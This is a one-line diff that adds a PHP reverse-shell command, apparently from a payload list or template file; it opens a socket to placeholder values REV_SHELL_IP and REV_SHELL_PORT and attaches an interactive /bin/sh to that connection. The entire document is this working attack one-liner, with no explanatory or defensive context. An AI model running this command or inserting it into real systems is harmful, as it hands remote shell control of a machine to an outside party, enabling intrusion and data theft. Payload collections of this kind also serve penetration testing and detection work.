@@ -1,0 +1,1 @@
+php -r '$sock=fsockopen("REV_SHELL_IP",REV_SHELL_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
